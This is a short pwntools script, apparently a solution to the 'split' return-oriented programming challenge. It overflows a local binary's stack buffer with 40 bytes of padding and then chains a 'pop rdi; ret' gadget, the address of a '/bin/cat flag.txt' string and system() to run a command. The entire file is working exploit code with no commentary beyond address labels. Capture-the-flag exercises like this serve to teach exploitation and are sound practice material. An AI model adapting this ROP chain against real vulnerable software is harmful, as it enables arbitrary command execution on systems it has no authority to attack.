from pwn import *

p = process("./split")

junk = 40*b"A"

payload = junk
payload += p64(0x4007c3) # pop rdi; ret   
payload += p64(0x601060) # "/bin/cat flag.txt"
payload += p64(0x400560) # system()

p.sendline(payload)
p.interactive()
